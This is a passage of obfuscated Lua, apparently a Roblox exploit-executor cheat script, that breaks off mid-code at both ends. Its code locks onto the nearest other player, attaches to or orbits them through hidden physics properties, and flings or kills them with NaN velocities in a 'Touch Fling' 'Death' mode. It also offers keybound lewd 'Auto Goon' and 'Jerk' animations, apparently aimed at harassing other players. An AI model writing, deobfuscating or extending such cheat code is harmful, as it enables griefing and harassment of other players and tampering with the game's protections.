 ) elseif not _IIIlIlIlIl.IsActive then local _lIIllIIlll = false for key, _IlIllllIII in pairs(_lIIIIIIIII) do if not _lIlIlIllll[key] and _IlIllllIII.IsActive then _lIIllIIlll = true break end
 end
 if not _lIIllIIlll and _lIIIIllIIl then _lIIIIllIIl:Disconnect() _lIIIIllIIl = nil end
 end
 end
 local function _llIIIlllIl(_IIIlIlIlIl) if _lIIIlIIIII then local _IIlIlIIllI = _lIIIlIIIII _lIIIlIIIII = nil pcall( function () _IIlIlIIllI:Stop() end
 ) pcall( function () _IIlIlIIllI:Destroy() end
 ) end
 if not _llIIIIllll then _lIIlIIllII(true) _llIIIIllll = true end
 _lIIIlIIIII = _IllllIIIlI(_IIIlIlIlIl, false, Enum.AnimationPriority.Action4) if _lIIIlIIIII then _lIIIlIIIII.Stopped:Connect( function () if _lIIIlIIIII then _lIIIlIIIII:Destroy() _lIIIlIIIII = nil end
 _llIIIIllll = false _llIlIllIlI() end
 ) end
 end
 local function _IIlIIlIIlI(match) for _lllIlllIIl, _lIIIIIIIII in pairs(_llIIIlIIll.PlayerGui.Hotbar.Backpack.Hotbar:GetDescendants()) do if _lIIIIIIIII.Name == "\084\111\111\108\078\097\109\101" and _lIIIIIIIII.Text:match(match) then return _lIIIIIIIII.Parent end
 end
 return nil end
 local function _IIlIlllIlI() local _IlIIIlIIlI = {} for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll ~= _llIIIlIIll and _IIIIIlIlll.Character and _IIIIIlIlll.Character:FindFirstChild("\070\111\114\099\101\070\105\101\108\100") then _IlIIIlIIlI[_IIIIIlIlll] = true end
 end
 return _IlIIIlIIlI end
 local function _llllIIlIlI() if getgenv().InvisActive or getgenv().FUCActive then return end
 if _lllIlIIIII then _lllIlIIIII:Disconnect() _lllIlIIIII = nil end
 _lIllIIIIlI = not _lIllIIIIlI if _lIllIIIIlI then local _IIllllIlII = _llIIIlIIll.Character local _IlIIlIIlIl = _IIllllIlII and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIIIlIIllI = _IlIIlIIlIl and _IlIIlIIlIl:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _IIIIlIIllI then _lIllIIIIlI = false return end
 _IllllllIlI() _IIlIllIIII = _IIIIlIIllI _lIIIIIIIII.TPOSE_A.Track = _IlIlllllll(_lIIIIIIIII.TPOSE_A, _IIIIlIIllI, Enum.AnimationPriority.Action3, 1e12) _lllIlIIIII = RunService.Heartbeat:Connect( function () if getgenv().InvisActive or getgenv().FUCActive then return end
 local _IIIlIlllll = _llIIIlIIll.Character local _IlIIIlIIII = _IIIlIlllll and _IIIlIlllll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _llllIlIllI = _IlIIIlIIII and _IlIIIlIIII:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _llllIlIllI then return end
 if _IIlIllIIII ~= _llllIlIllI then _IllllllIlI() _IIlIllIIII = _llllIlIllI _lIIIIIIIII.TPOSE_A.Track = _IlIlllllll(_lIIIIIIIII.TPOSE_A, _llllIlIllI, Enum.AnimationPriority.Action3, 1e12) return end
 local _llIIIIllII = _lIIIIIIIII.TPOSE_A if not _llIIIIllII.Track or not _llIIIIllII.Track.IsPlaying then if _llIIIIllII.Track then pcall( function () _llIIIIllII.Track:Destroy() end
 ) end
 _llIIIIllII.Track = _IlIlllllll(_llIIIIllII, _llllIlIllI, Enum.AnimationPriority.Action3, 1e12) end
 end
 ) else _IllllllIlI() end
 end
 local _IIIIIlllII = nil local _llIlIlIlIl = nil local _IlIllllIII = nil local function _IllIlIIIIl() local _IIllllIlII = _llIIIlIIll.Character if _lllllIIIIl then _lllllIIIIl = false if _lIIIIlIlIl then _lIIIIlIlIl:Disconnect() _lIIIIlIlIl = nil end
 if _IIIIIlllII then _IIIIIlllII:Disconnect() _IIIIIlllII = nil end
 if _llIlIlIlIl then _llIlIlIlIl:Disconnect() _llIlIlIlIl = nil end
 local _IllIIIlIlI = _llIIIlIIll.Character local _llIIlIIlII = _IllIIIlIlI and _IllIIIlIlI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _llIIlIIlII then if sethiddenproperty then pcall( function () sethiddenproperty(_llIIlIIlII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 _llIIlIIlII.AssemblyLinearVelocity = Vector3.zero _llIIlIIlII.AssemblyAngularVelocity = Vector3.zero pcall( function () _llIIlIIlII.Velocity = Vector3.zero end
 ) pcall( function () _llIIlIIlII.RotVelocity = Vector3.zero end
 ) end
 if _llIlIlIlII.target and _llIlIlIlII.target.Parent then pcall( function () sethiddenproperty(_llIlIlIlII.target, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _llIlIlIlII.target.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _llIlIlIlII.target.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _llIlIlIlII.target.Velocity = Vector3.zero end
 ) pcall( function () _llIlIlIlII.target.RotVelocity = Vector3.zero end
 ) end
 _llIlIlIlII.target = nil _llIlIlIlII.player = nil local _lIIIIIlllI = _IllIIIlIlI and _IllIIIlIlI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIIIIIlllI then pcall( function () _lIIIIIlllI.AutoRotate = true end
 ) pcall( function () _lIIIIIlllI:ChangeState(Enum.HumanoidStateType.GettingUp) end
 ) end
 if _lllIlIIIIl and _llIIlIIlII then local _IllllIlIII = _lllIlIIIIl _lllIlIIIIl = nil task.spawn( function () for _lllIlllIIl = 0x1, 0x4 do RunService.Heartbeat:Wait() _llIIlIIlII.AssemblyLinearVelocity = Vector3.zero _llIIlIIlII.AssemblyAngularVelocity = Vector3.zero pcall( function () _llIIlIIlII.Velocity = Vector3.zero end
 ) pcall( function () _llIIlIIlII.RotVelocity = Vector3.zero end
 ) _llIIlIIlII.CFrame = _IllllIlIII end
 end
 ) end
 pcall( function () _lllIIIIllI.Weld = true _IIlIlIIlIl.TogWeld:SetValue(false) _lllIIIIllI.Weld = false end
 ) pcall( function () _IlIllIIllI.KPWeld.Toggled = false end
 ) if not _llIllllllI and not _IlIIlIlIII then _IllIlIIIII() end
 _IllIIlIIll:Notify({ Title = _llIllllllI and "\065\116\116\097\099\104" or "\079\114\098\105\116", Content = "\084\111\103\103\108\101\100\032\111\102\102\032\10060", _IllIIlIlll = 0x2 }) return end
 local _IIlIlIllII = false do local _lIlIlIIlII = workspace.CurrentCamera local _IIIlIIIllI = _IIllllIlII and _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IIllllllIl = {} for _lllIlllIIl, _IIIIIlIlll in ipairs(game:GetService("\080\108\097\121\101\114\115"):GetPlayers()) do table.insert(_IIllllllIl, _IIIIIlIlll) end
 local _lIlIllllII = workspace:FindFirstChild("\076\105\118\101") if _lIlIllllII then for _lllIlllIIl, _llllIIIIIl in ipairs(_lIlIllllII:GetChildren()) do if _llllIIIIIl:IsA("\077\111\100\101\108") and _llllIIIIIl:FindFirstChild("\072\117\109\097\110\111\105\100") then table.insert(_IIllllllIl, _llllIIIIIl) end
 end
 end
 for _lllIlllIIl, _lllIIlllll in ipairs(_IIllllllIl) do local _lIlIllllll = (_lllIIlllll == _llIIIlIIll) or (typeof(_lllIIlllll) == "\073\110\115\116\097\110\099\101" and _lllIIlllll:IsA("\077\111\100\101\108") and _lllIIlllll == _llIIIlIIll.Character) if not _lIlIllllll then local _lIlIIIIlII = (typeof(_lllIIlllll) == "\073\110\115\116\097\110\099\101" and _lllIIlllll:IsA("\080\108\097\121\101\114") and _lllIIlllll.Character) or _lllIIlllll if _lIlIIIIlII then local _IlIIIlIIII = _lIlIIIIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIlIIII and _IlIIIlIIII.Health > 0x0 then _IIlIlIllII = true break end
 end
 end
 end
 end
 if not _IIlIlIllII then return end
 if not _IIllllIlII then return end
 local _IIIlIIIllI = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IIIlIIIllI then return end
 _lllllIIIIl = true _lllIlIIIIl = _IIIlIIIllI.CFrame _IIIlIIIllI.AssemblyLinearVelocity = Vector3.zero _IIIlIIIllI.AssemblyAngularVelocity = Vector3.zero if sethiddenproperty then pcall( function () sethiddenproperty(_IIIlIIIllI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIIlIIIllI) end
 ) end
 pcall( function () _lllIIIIllI.Weld = true _IIlIlIIlIl.TogWeld:SetValue(true) _lllIIIIllI.Weld = false end
 ) pcall( function () _IlIllIIllI.KPWeld.Toggled = true end
 ) local function _IIlllIIlIl() local _lIlIlIIlII = workspace.CurrentCamera local _IIlIIlIlll = _lIlIIlIlII:GetMouseLocation() local _IIIIIlIIII = math.huge local _lIlIlIIIlI, bestRoot = nil, nil local _IIllllllIl = {} for _lllIlllIIl, _IIIIIlIlll in ipairs(game:GetService("\080\108\097\121\101\114\115"):GetPlayers()) do table.insert(_IIllllllIl, _IIIIIlIlll) end
 local _lIlIllllII = workspace:FindFirstChild("\076\105\118\101") if _lIlIllllII then for _lllIlllIIl, _llllIIIIIl in ipairs(_lIlIllllII:GetChildren()) do if _llllIIIIIl:IsA("\077\111\100\101\108") and _llllIIIIIl:FindFirstChild("\072\117\109\097\110\111\105\100") then table.insert(_IIllllllIl, _llllIIIIIl) end
 end
 end
 for _lllIlllIIl, _lllIIlllll in ipairs(_IIllllllIl) do local _lIlIllllll = (_lllIIlllll == _llIIIlIIll) or (typeof(_lllIIlllll) == "\073\110\115\116\097\110\099\101" and _lllIIlllll:IsA("\077\111\100\101\108") and _lllIIlllll == _llIIIlIIll.Character) if _lIlIllllll then continue end
 local _lIlIIIIlII = (typeof(_lllIIlllll) == "\073\110\115\116\097\110\099\101" and _lllIIlllll:IsA("\080\108\097\121\101\114") and _lllIIlllll.Character) or _lllIIlllll if not _lIlIIIIlII then continue end
 local _IlIIIlIIII = _lIlIIIIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _IlIIIlIIII or _IlIIIlIIII.Health <= 0x0 then continue end
 local _llIIlIIlII = _IlIIIlIIII.RootPart or _lIlIIIIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _llIIlIIlII then continue end
 if _IlIIIlIIII.Health ~= 0x0 and workspace.CurrentCamera then local _lIlIIlllll = workspace.CurrentCamera:WorldToViewportPoint(_llIIlIIlII.Position) local _IlIllllIII = (Vector2.new(_lIlIIlllll.X, _lIlIIlllll.Y) - _IIlIIlIlll).Magnitude if _IlIllllIII < _IIIIIlIIII then _IIIIIlIIII = _IlIllllIII _lIlIlIIIlI = _lllIIlllll bestRoot = _llIIlIIlII end
 end
 end
 return bestRoot, _lIlIlIIIlI end
 local _IlIlllllIl, _lockedPlayer = _IIlllIIlIl() _llIlIlIlII.target = _IlIlllllIl _llIlIlIlII.player = _lockedPlayer if not _IlIlllllIl or not _lockedPlayer then _lllllIIIIl = false pcall( function () _lllIIIIllI.Weld = true _IIlIlIIlIl.TogWeld:SetValue(false) _lllIIIIllI.Weld = false end
 ) pcall( function () _IlIllIIllI.KPWeld.Toggled = false end
 ) local _IllIIIlIlI = _llIIIlIIll.Character local _llIIlIIlII = _IllIIIlIlI and _IllIIIlIlI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _llIIlIIlII then _llIIlIIlII.AssemblyLinearVelocity = Vector3.zero _llIIlIIlII.AssemblyAngularVelocity = Vector3.zero pcall( function () _llIIlIIlII.Velocity = Vector3.zero end
 ) pcall( function () _llIIlIIlII.RotVelocity = Vector3.zero end
 ) end
 return end
 local _IIllIIlIlI = nil local function _IIlIIlllll() _lllllIIIIl = false if _lIIIIlIlIl then _lIIIIlIlIl:Disconnect() _lIIIIlIlIl = nil end
 if _IIIIIlllII then _IIIIIlllII:Disconnect() _IIIIIlllII = nil end
 pcall( function () if _llIlIlIlIl then _llIlIlIlIl:Disconnect() _llIlIlIlIl = nil if _IlIllllIII and _IlIllllIII.Parent then local _llIlIIIlIl = _IlIllllIII.Parent:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _llIlIIIlIl then pcall( function () _llIlIIIlIl.AutoRotate = true end
 ) end
 end
 _IlIllllIII = nil end
 end
 ) local _IllIIIlIlI = _llIIIlIIll.Character local _llIIlIIlII = _IllIIIlIlI and _IllIIIlIlI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _llIIlIIlII then if sethiddenproperty then pcall( function () sethiddenproperty(_llIIlIIlII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 _llIIlIIlII.AssemblyLinearVelocity = Vector3.zero _llIIlIIlII.AssemblyAngularVelocity = Vector3.zero pcall( function () _llIIlIIlII.Velocity = Vector3.zero end
 ) pcall( function () _llIIlIIlII.RotVelocity = Vector3.zero end
 ) end
 if _llIlIlIlII.target and _llIlIlIlII.target.Parent then pcall( function () sethiddenproperty(_llIlIlIlII.target, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _llIlIlIlII.target.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _llIlIlIlII.target.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _llIlIlIlII.target.Velocity = Vector3.zero end
 ) pcall( function () _llIlIlIlII.target.RotVelocity = Vector3.zero end
 ) end
 _llIlIlIlII.target = nil _llIlIlIlII.player = nil local _llIlIIlIll = _IllIIIlIlI and _IllIIIlIlI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _llIlIIlIll then pcall( function () _llIlIIlIll.AutoRotate = true end
 ) pcall( function () _llIlIIlIll:ChangeState(Enum.HumanoidStateType.GettingUp) end
 ) end
 if _lllIlIIIIl and _llIIlIIlII then local _IllllIlIII = _lllIlIIIIl _lllIlIIIIl = nil task.spawn( function () for _lllIlllIIl = 0x1, 0x4 do RunService.Heartbeat:Wait() _llIIlIIlII.AssemblyLinearVelocity = Vector3.zero _llIIlIIlII.AssemblyAngularVelocity = Vector3.zero pcall( function () _llIIlIIlII.Velocity = Vector3.zero end
 ) pcall( function () _llIIlIIlII.RotVelocity = Vector3.zero end
 ) _llIIlIIlII.CFrame = _IllllIlIII end
 end
 ) end
 pcall( function () _lllIIIIllI.Weld = true _IIlIlIIlIl.TogWeld:SetValue(false) _lllIIIIllI.Weld = false end
 ) pcall( function () _IlIllIIllI.KPWeld.Toggled = false end
 ) if not _llIllllllI and not _IlIIlIlIII then _IllIlIIIII() end
 _IllIIlIIll:Notify({ Title = _llIllllllI and "\065\116\116\097\099\104" or "\079\114\098\105\116", Content = "\084\111\103\103\108\101\100\032\111\102\102\032\10060", _IllIIlIlll = 0x2 }) end
 _IIIIIlllII = game:GetService("\080\108\097\121\101\114\115").PlayerRemoving:Connect( function (_IIIIIlIlll) if _IIIIIlIlll == _lockedPlayer then _IIlIIlllll() end
 end
 ) if _llIllllllI then local _lIIIlllIIl = 0x0 local _IlIllllIII = nil local function _llllIIlIll(_IIIlIIIllI, _IlIIIlIIII) if _llIlIlIlIl then return end
 _IlIllllIII = _IIIlIIIllI _llIlIlIlIl = RunService.RenderStepped:Connect( function () if _IlIIIlIIII and _IlIIIlIIII.Parent then pcall( function () _IlIIIlIIII.AutoRotate = false end
 ) end
 end
 ) end
 local function _IIllIllllI() if _llIlIlIlIl then _llIlIlIlIl:Disconnect() _llIlIlIlIl = nil end
 if _IlIllllIII and _IlIllllIII.Parent then local _llIlIIIlIl = _IlIllllIII.Parent:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _llIlIIIlIl then pcall( function () _llIlIIIlIl.AutoRotate = true end
 ) end
 end
 _IlIllllIII = nil end
 _lIIIIlIlIl = RunService.Heartbeat:Connect( function () if not _lllllIIIIl then return end
 local _IllIIIlIlI = _llIIIlIIll.Character local _IlIlIIlIll = _IllIIIlIlI and _IllIIIlIlI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IllIIIlIlI or not _IlIlIIlIll then local _IlIIIIIIll = _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IlIIIIIIll then pcall( function () sethiddenproperty(_IlIIIIIIll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 return end
 if _lockedPlayer and _lockedPlayer.Parent then local _IlIIIlIIll = (typeof(_lockedPlayer) == "\073\110\115\116\097\110\099\101" and _lockedPlayer:IsA("\080\108\097\121\101\114") and _lockedPlayer.Character) or _lockedPlayer if _IlIIIlIIll then local _lIIlllllII = _IlIllIIllI.AttachMethod and _IlIllIIllI.AttachMethod.Value == "\072\105\116\098\111\120\032\065\099\099\117\114\097\116\101" local _llIIlIIlll if _lIIlllllII then local _lIIlllIlll = _IlIIIlIIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") _llIIlIIlll = _lIIlllIlll and _lIIlllIlll.RootPart local _IIIIIIIIll = _IllIIIlIlI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIIIIIIIll then _llllIIlIll(_IlIlIIlIll, _IIIIIIIIll) end
 else if _llIlIlIlIl then _IIllIllllI() end
 _llIIlIIlll = _IlIIIlIIll:FindFirstChild("\085\112\112\101\114\084\111\114\115\111") or _IlIIIlIIll:FindFirstChild("\084\111\114\115\111") or _IlIIIlIIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") end
 if _llIIlIIlll then _IlIlllllIl = _llIIlIIlll _llIlIlIlII.target = _llIIlIIlll end
 end
 if not _IlIlllllIl or not _IlIlllllIl.Parent then return end
 else _IIlIIlllll() return end
 local _IlllIlIIIl = _IlIllIIllI.AttachMethod and _IlIllIIllI.AttachMethod.Value == "\079\114\098\105\116" if _IlllIlIIIl then local _llIlIIllII = _IlIllIIllI.AttachOrbitSpeed and _IlIllIIllI.AttachOrbitSpeed.Value or 0xA local _IIIlllIlIl = _IlIllIIllI.AttachOrbitDistance and _IlIllIIllI.AttachOrbitDistance.Value or 0x3 _lIIIlllIIl = _lIIIlllIIl + _llIlIIllII local _IIIlIIlIII = _IlIlllllIl.Position local _lIlIIIlIlI = CFrame.Angles(0x0, math.rad(_lIIIlllIIl), 0x0) * CFrame.new(_IIIlllIlIl, 0x0, 0x0) local _lIlIllIlIl = _IllIIIlIlI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlIllIlIl then local _IlllIIIIII = _lIlIIlIlII.MouseBehavior == Enum.MouseBehavior.LockCenter pcall( function () _lIlIllIlIl.AutoRotate = _IlllIIIIII end
 ) end
 local _lIIIllllll = CFrame.new(_IIIlIIlIII.X, _IIIlIIlIII.Y, _IIIlIIlIII.Z) * _lIlIIIlIlI local _IIlIllIIll = CFrame.lookAt(_lIIIllllll.Position, Vector3.new(_IIIlIIlIII.X, _lIIIllllll.Position.Y, _IIIlIIlIII.Z)) _IlIlIIlIll.CFrame = _IIlIllIIll _IlIlIIlIll.AssemblyLinearVelocity = Vector3.zero _IlIlIIlIll.AssemblyAngularVelocity = Vector3.zero pcall( function () sethiddenproperty(_IlIlIIlIll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IlIlllllIl) end
 ) else local _lIIIIlIIIl = _IlIllIIllI.WeldOffsetX and _IlIllIIllI.WeldOffsetX.Value or 0x0 local _IlIIlllIII = _IlIllIIllI.WeldOffsetY and _IlIllIIllI.WeldOffsetY.Value or 0x0 local _llllIIIllI = _IlIllIIllI.WeldOffsetZ and _IlIllIIllI.WeldOffsetZ.Value or 0x0 _IlIlIIlIll.CFrame = _IlIlllllIl.CFrame * CFrame.new(_lIIIIlIIIl, _IlIIlllIII, -_llllIIIllI) local _IlIllIlIIl = _IlIIlIllIl and _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103"] and _IlIllIIllI.TouchFlingMethod and _IlIllIIllI.TouchFlingMethod.Value == "\068\101\097\116\104" if _IlIllIlIIl then local _IIIIIIIIll = 0x0/0x0 local _IIlIIllIlI = Vector3.new(_IIIIIIIIll, _IIIIIIIIll, _IIIIIIIIll) _IlIlIIlIll.AssemblyLinearVelocity = _IIlIIllIlI _IlIlIIlIll.AssemblyAngularVelocity = _IIlIIllIlI else _IlIlIIlIll.AssemblyLinearVelocity = Vector3.zero _IlIlIIlIll.AssemblyAngularVelocity = Vector3.zero end
 local _lIIIIIllII = _IllIIIlIlI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIIIIIllII then local _IlllIIIIII = _lIlIIlIlII.MouseBehavior == Enum.MouseBehavior.LockCenter pcall( function () _lIIIIIllII.AutoRotate = _IlllIIIIII end
 ) if _IlIllIlIIl then pcall( function () local _IllllIIlIl = 0x0/0x0 sethiddenproperty(_lIIIIIllII, "\077\111\118\101\068\105\114\101\099\116\105\111\110\073\110\116\101\114\110\097\108", Vector3.new(_IllllIIlIl, _IllllIIlIl, _IllllIIlIl)) end
 ) end
 end
 pcall( function () sethiddenproperty(_IlIlIIlIll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IlIlllllIl) end
 ) end
 end
 ) else local _llIllllIIl = 0x0 if not _IlIIlIlIII then _lIlIIIIlIl(_lockedPlayer) end
 task.spawn( function () while _lllllIIIIl do local _llllllIIII = _llIIIlIIll.Character local _llIlIIllII = _llllllIIII and _llllllIIII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IIlIllIIII = _llllllIIII and _llllllIIII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IlIIIlIIll = _lockedPlayer and _lockedPlayer.Character local _lIllIIlIlI = _IlIIIlIIll and _IlIIIlIIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IllIlIIIlI = _IlIIIlIIll and _IlIIIlIIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _llllllIIII and _llIlIIllII and _IIlIllIIII and _lockedPlayer and _lockedPlayer.Parent and _IlIIIlIIll and _lIllIIlIlI and _IllIlIIIlI then local _llIlIIllII = _IlIllIIllI.OrbitSpeed and _IlIllIIllI.OrbitSpeed.Value or 0xA local _IIIlllIlIl = _IlIllIIllI.OrbitDistance and _IlIllIIllI.OrbitDistance.Value or 0x3 _llIllllIIl = _llIllllIIl + _llIlIIllII local _IIlllIIlll = _lIllIIlIlI.Position + _IllIlIIIlI.MoveDirection * _lIllIIlIlI.Velocity.Magnitude / 2.75 local _lIlIIIlIlI = CFrame.Angles(0x0, math.rad(_llIllllIIl), 0x0) * CFrame.new(_IIIlllIlIl, 0x0, 0x0) _llIlIIllII.CFrame = CFrame.lookAt(_llIlIIllII.Position, Vector3.new(_IIlllIIlll.X, _llIlIIllII.Position.Y, _IIlllIIlll.Z)) task.wait() _llIlIIllII.CFrame = CFrame.new(_IIlllIIlll.X, _lIllIIlIlI.Position.Y, _IIlllIIlll.Z) * _lIlIIIlIlI elseif not _lockedPlayer or not _lockedPlayer.Parent then _IIlIIlllll() break end
 RunService.RenderStepped:Wait() end
 end
 ) end
 _IllIIlIIll:Notify({ Title = _llIllllllI and "\065\116\116\097\099\104" or "\079\114\098\105\116", Content = "\084\111\103\103\108\101\100\032\111\110\032\9989", _IllIIlIlll = 0x2 }) end
 local function _IlIllllIlI(elem, visible) if not elem then return end
 local _lIIlIIIlII = pcall( function () elem:SetVisible(visible) end
 ) if not _lIIlIIIlII then pcall( function () local _lIIlIllIll = elem.Frame or elem.HolderFrame or elem.Container if _lIIlIllIll then _lIIlIllIll.Visible = visible end
 end
 ) end
 end
 local function _IlIIlIllII() _lIlIIIlIll = RunService.Heartbeat:Connect( function () if not _IIlIlIIlIl.TogHeadFloat.Value then return end
 if not _lIIIIIIIII.L_KEY.IsActive then return end
 local _IIllllIlII = _llIIIlIIll.Character local _IlIIlIIlIl = _IIllllIlII and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIIIlIIllI = _IlIIlIIlIl and _IlIIlIIlIl:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _IIIIlIIllI then return end
 local _IlIllllIII = _lIIIIIIIII.L_KEY if not _IlIllllIII.Track or not _IlIllllIII.Track.IsPlaying then if _IlIllllIII.Track then pcall( function () _IlIllllIII.Track:Destroy() end
 ) end
 local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IlIllllIII.Id _IlIllllIII.Track = _IIIIlIIllI:LoadAnimation(_llllIlIllI) _IlIllllIII.Track.Priority = Enum.AnimationPriority.Action4 _IlIllllIII.Track.Looped = true _IlIllllIII.Track:AdjustWeight(1e13) _IlIllllIII.Track:Play() _IlIllllIII.Track:AdjustSpeed(_IlIllllIII.Speed) _IlIllllIII.Track.TimePosition = _IlIllllIII.StartTime end
 end
 ) end
 local function _llllIIIlIl() if _lIlIIIlIll then _lIlIIIlIll:Disconnect() _lIlIIIlIll = nil end
 end
 local _IlIIlIIllI = _llIIIlIIll.CharacterAdded:Connect( function () if _IIllIlIlIl then _IIllIlIlIl = false _IllIlIIIII() if _llIIllIIIl then _llIIllIIIl:Disconnect() _llIIllIIIl = nil end
 end
 if _lllIlIIIII then _lllIlIIIII:Disconnect() _lllIlIIIII = nil end
 for _lllIlllIIl, _IIIlIlIlIl in pairs(_lIIIIIIIII) do _IIIlIlIlIl.Track = nil end
 _llllIIIlIl() _lIllIIIIlI = false local _IIllIlIIll = _lIIIIIIIII.F2_KEY if _IIllIlIIll.Track then pcall( function () _IIllIlIIll.Track:Stop() end
 ) pcall( function () _IIllIlIIll.Track:Destroy() end
 ) _IIllIlIIll.Track = nil end
 local _llIlIllIII = _lIIIIIIIII.TPOSE_A if _llIlIllIII.Track then pcall( function () _llIlIllIII.Track:Stop() end
 ) pcall( function () _llIlIllIII.Track:Destroy() end
 ) _llIlIllIII.Track = nil end
 _IIlIllIIII = nil _lIIIlIIIII = nil _llIIIIllll = false _llllllIlll = {} task.spawn(_llllIllIlI) end
 ) local _IlIllllIll = _llIIIlIIll.CharacterRemoving:Connect(_llIlllllll) local _lllIIIIllI = {} local _IllllIllll = {} local _llIIIIIllI = _IIllIIlIII:AddToggle("\084\111\103\072\101\097\100\070\108\111\097\116", { Text = "\072\101\097\100\032\070\108\111\097\116", Default = false, Callback = function (_lIllIlIIll) if _lIllIlIIll then local _lIIIIIIIII = _IlIllIIllI.SpamSpeed and _IlIllIIllI.SpamSpeed.Value if _lIIIIIIIII then _IlllIIIllI = _lIIIIIIIII end
 else if _IlIllIIllI.KPHeadFloat then _IlIllIIllI.KPHeadFloat.Toggled = false end
 _llllIIIlIl() if _lIIIIIIIII.L_KEY.IsActive then _IIllIIIIII(_lIIIIIIIII.L_KEY) end
 end
 end
 , }) _llIIIIIllI:AddKeyPicker("\075\080\072\101\097\100\070\108\111\097\116", { Default = "\076", Text = "\072\101\097\100\032\070\108\111\097\116", SyncToggleState = false, Mode = "\084\111\103\103\108\101", Callback = function () if not _IIlIlIIlIl.TogHeadFloat.Value then _IlIllIIllI.KPHeadFloat.Toggled = false return end
 if _lIIlIIlIll() then return end
 _IIllIIIIII(_lIIIIIIIII.L_KEY) end
 , }) do local _IIIllIIIIl = _IIllIIlIII:AddDependencyBox() _IIIllIIIIl:AddSlider("\083\112\097\109\083\112\101\101\100", { Text = "\072\101\097\100\032\070\108\111\097\116\032\083\112\097\109\032\068\101\108\097\121", Default = 0.1, Min = 0.05, Max = 0x1, Rounding = 0x2, Callback = function (V) _IlllIIIllI = V end
 }) _IIIllIIIIl:SetupDependencies({{ _llIIIIIllI, true }}) end
 local _IllllIlIII = _IIllIIlIII:AddToggle("\084\111\103\074\101\114\107", { Text = "\065\117\116\111\032\071\111\111\110", Default = false, Callback = function (_lIllIlIIll) if _lIllIlIIll then local _lIIIIIIIII = _IlIllIIllI.JerkSpeed and _IlIllIIllI.JerkSpeed.Value if _lIIIIIIIII then _lIIIIIIIII.JERK.Speed = _lIIIIIIIII end
 else if _IlIllIIllI.KPJerk then _IlIllIIllI.KPJerk.Toggled = false end
 if _lIIIIIIIII.JERK.IsActive then _IIllIIIIII(_lIIIIIIIII.JERK) end
 end
 end
 , }) _IllllIlIII:AddKeyPicker("\075\080\074\101\114\107", { Default = "\074", Text = "\065\117\116\111\032\071\111\111\110", SyncToggleState = false, Mode = "\084\111\103\103\108\101", Callback = function () if not _IIlIlIIlIl.TogJerk.Value then _IlIllIIllI.KPJerk.Toggled = false return end
 if _lIIlIIlIll() then return end
 _IIllIIIIII(_lIIIIIIIII.JERK) end
 , }) do local _IIIllIIIIl = _IIllIIlIII:AddDependencyBox() _IIIllIIIIl:AddSlider("\074\101\114\107\083\112\101\101\100", { Text = "\065\117\116\111\032\071\111\111\110\032\083\112\101\101\100", Default = 0x1, Min = 0x0, Max = 0xA, Rounding = 0x1, Callback = function (V) _lIIIIIIIII.JERK.Speed = V if _lIIIIIIIII.JERK.Track then _lIIIIIIIII.JERK.Track:AdjustSpeed(V) end
 end
 }) _IIIllIIIIl:SetupDependencies({{ _IllllIlIII, true }}) end
